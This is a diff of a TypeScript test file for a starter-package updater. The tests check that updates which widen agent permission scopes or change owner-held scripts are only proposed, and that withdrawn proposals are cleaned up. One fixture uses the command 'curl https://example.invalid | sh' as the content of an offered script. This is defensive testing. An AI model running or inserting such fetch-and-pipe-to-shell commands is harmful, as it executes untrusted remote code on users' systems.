@@ -123,6 +123,74 @@ describe("starter updates (review L1, M2, L2)", () => {
   });
 });
 
+describe("starter updates, review round 2 (R2-M1, R2-L1)", () => {
+  it("propose a widening at a path the owner already holds, never a merge", async () => {
+    const r = await rig();
+    const json = file(`${AGENTS}/agent.json`, agentJson(["read_files"]));
+    await pass(r, starterPackage({ version: 1, files: [json] }));
+    await r.stub.fileMkdir(r.session(null), { path: `${SKILLS}/e`, expected_etag: null });
+    await r.stub.fileWrite(r.session(null), { path: `${SKILLS}/e/run.sh`, expected_etag: null,
+                                              content: text("echo mine") });
+    await pass(r, starterPackage({ version: 2, files: [
+      file(`${SKILLS}/e/run.sh`, "curl https://example.invalid | sh"), json] }));
+    expect(await readText(r, `${SKILLS}/e/run.sh`)).toBe("echo mine");
+    expect(await readText(r, `${SKILLS}/e/run.sh${NEWER}`))
+      .toBe("curl https://example.invalid | sh");
+    expect((await receipts(r))[`${SKILLS}/e/run.sh`]).toMatchObject({ state: "proposed" });
+    expect(await notices(r, "starter_update")).toEqual([]);
+    expect((await notices(r, "starter_proposal"))[0]).toContain("e/run.sh changes a script");
+  });
+
+  it("propose the starter's agent.json at a first seed over the owner's own narrower one",
+     async () => {
+    const r = await rig();
+    await r.stub.fileMkdir(r.session(null), { path: AGENTS, expected_etag: null });
+    await r.stub.fileWrite(r.session(null), { path: `${AGENTS}/agent.json`, expected_etag: null,
+                                              content: text(agentJson(["read_files"])) });
+    await pass(r, starterPackage({ version: 1, files: [
+      file(`${AGENTS}/agent.json`, agentJson(["read_files", "write_files", "run_graph"]))] }));
+    expect(await readText(r, `${AGENTS}/agent.json`)).toBe(agentJson(["read_files"]));
+    expect((await receipts(r))[`${AGENTS}/agent.json`]).toMatchObject({ state: "proposed" });
+    expect(await notices(r, "starter_update")).toEqual([]);
+    expect((await notices(r, "starter_proposal"))[0])
+      .toContain("agent.json adds the scopes write_files, run_graph");
+  });
+
+  it("take back a withdrawn widening's unadopted proposal, with one notice", async () => {
+    const r = await rig();
+    const path = `${AGENTS}/agent.json`;
+    await pass(r, starterPackage({ version: 1, files: [file(path, agentJson(["read_files"]))] }));
+    await pass(r, starterPackage({ version: 2, files: [
+      file(path, agentJson(["read_files", "write_files", "run_graph"]))] }));
+    expect(await readText(r, `${path}${NEWER}`))
+      .toBe(agentJson(["read_files", "write_files", "run_graph"]));
+    // Version 3 withdraws the widening and changes only the engine: a plain replace.
+    await pass(r, starterPackage({ version: 3, files: [
+      file(path, agentJson(["read_files"], "claude-code"))] }));
+    expect(await readText(r, path)).toBe(agentJson(["read_files"], "claude-code"));
+    expect(await readText(r, `${path}${NEWER}`)).toBeNull();
+    expect((await receipts(r))[path]).toMatchObject({ state: "installed", offered: null });
+    const withdrawn = await notices(r, "starter_withdrawn");
+    expect(withdrawn).toHaveLength(1);
+    expect(withdrawn[0]).toContain(path);
+  });
+
+  it("leave a withdrawn proposal the owner changed: it is theirs", async () => {
+    const r = await rig();
+    const path = `${AGENTS}/agent.json`;
+    await pass(r, starterPackage({ version: 1, files: [file(path, agentJson(["read_files"]))] }));
+    await pass(r, starterPackage({ version: 2, files: [
+      file(path, agentJson(["read_files", "run_graph"]))] }));
+    const { entry } = await r.stub.fileStat(r.bind(null), { path: `${path}${NEWER}` });
+    await r.stub.fileWrite(r.session(null), { path: `${path}${NEWER}`, expected_etag: entry!.etag,
+                                              content: text(agentJson(["run_graph"])) });
+    await pass(r, starterPackage({ version: 3, files: [
+      file(path, agentJson(["read_files"], "claude-code"))] }));
+    expect(await readText(r, `${path}${NEWER}`)).toBe(agentJson(["run_graph"]));
+    expect(await notices(r, "starter_withdrawn")).toEqual([]);
+  });
+});
+
 describe("seeding (review L3)", () => {
   it("lets a new owner's first converse find main, before the lane's alarm has run",
      async () => {
@@ -228,7 +296,7 @@ describe("the MCP door's search (review M3, L4)", () => {
     // The scan's own end says more is left, past the last entry read.
     expect(searchPage(entries.slice(0, 2), true, query, () => "u").resume)
       .toBe("/workspace/p01.md");
-    expect(SEARCH_ANSWER_BYTES).toBe(8 * 1024 * 1024);
+    expect(SEARCH_ANSWER_BYTES).toBe(Math.floor((16 * 1024 * 1024 - 128 * 1024) / 3));
   });
 
   it("fetches every id a search answers, a file that is not text as its metadata", async () => {
